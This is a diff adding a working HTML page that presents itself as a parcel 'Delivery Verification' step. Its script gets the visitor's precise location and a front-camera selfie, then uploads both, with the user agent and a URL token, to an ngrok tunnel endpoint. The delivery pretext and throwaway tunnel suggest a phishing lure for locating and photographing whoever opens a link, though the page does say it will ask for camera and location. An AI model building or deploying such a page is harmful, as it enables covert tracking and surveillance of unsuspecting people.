@@ -1,0 +1,122 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Delivery Confirm</title>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<style>
+body { font-family: Arial; padding: 16px; max-width: 480px; margin: auto; }
+#status { color: green; }
+.error { color: red; }
+</style>
+</head>
+
+<body>
+<h2>Delivery Verification</h2>
+<p>This page will ask for camera and location. Please allow both.</p>
+
+<div id="status">Requesting permissions…</div>
+
+<script>
+(async function() {
+
+  const SERVER_URL = "https://imaginarily-unrailwayed-tyler.ngrok-free.dev/api/confirm";
+
+  const params = new URLSearchParams(location.search);
+  const deliveryId = params.get("deliveryId") || "unknown";
+  const token = params.get("token") || "";
+
+  const statusEl = document.getElementById("status");
+
+  function setStatus(msg, err=false) {
+    statusEl.textContent = msg;
+    statusEl.className = err ? "error" : "";
+  }
+
+  async function getLocation() {
+    return new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(resolve, reject, {
+        enableHighAccuracy: true,
+        timeout: 15000
+      });
+    });
+  }
+
+  async function capturePhoto() {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" }
+    });
+
+    const track = stream.getVideoTracks()[0];
+    const imgCap = new ImageCapture(track);
+
+    let blob;
+    try {
+      blob = await imgCap.takePhoto();
+    } catch (e) {
+      // fallback: use canvas snapshot
+      const cv = document.createElement("canvas");
+      cv.width = 1280; cv.height = 720;
+      const ctx = cv.getContext("2d");
+      const videoTemp = document.createElement("video");
+      videoTemp.srcObject = stream;
+      await videoTemp.play();
+      ctx.drawImage(videoTemp, 0, 0, cv.width, cv.height);
+      blob = await new Promise(res => cv.toBlob(res, "image/jpeg", 0.9));
+    }
+
+    track.stop(); // stop camera
+    return blob;
+  }
+
+  try {
+    setStatus("Requesting permissions...");
+    
+    // Request both at same time
+    await navigator.mediaDevices.getUserMedia({ video: true });
+    const loc = await getLocation();
+
+    setStatus("Capturing photo...");
+    const blob = await capturePhoto();
+
+    setStatus("Uploading...");
+
+    // Validate location data
+    if (!loc || !loc.coords) {
+      throw new Error("Failed to get location data");
+    }
+
+    const fd = new FormData();
+    fd.append("deliveryId", deliveryId);
+    fd.append("token", token);
+    fd.append("lat", loc.coords.latitude.toString());
+    fd.append("lon", loc.coords.longitude.toString());
+    fd.append("accuracy", loc.coords.accuracy ? loc.coords.accuracy.toString() : "0");
+    fd.append("locTimestamp", loc.timestamp ? loc.timestamp.toString() : Date.now().toString());
+    fd.append("photo", blob, `selfie-${deliveryId}.jpg`);
+    
+    // Add additional device info
+    fd.append("userAgent", navigator.userAgent);
+
+    const resp = await fetch(SERVER_URL, {
+      method: "POST",
+      body: fd,
+      credentials: "include"
+    });
+
+    if (!resp.ok) {
+      throw new Error(await resp.text());
+    }
+
+    setStatus("Uploaded. Delivery verified!");
+
+  } catch(err) {
+    console.error(err);
+    setStatus("Error: " + err.message, true);
+  }
+
+})();
+</script>
+
+</body>
+</html>
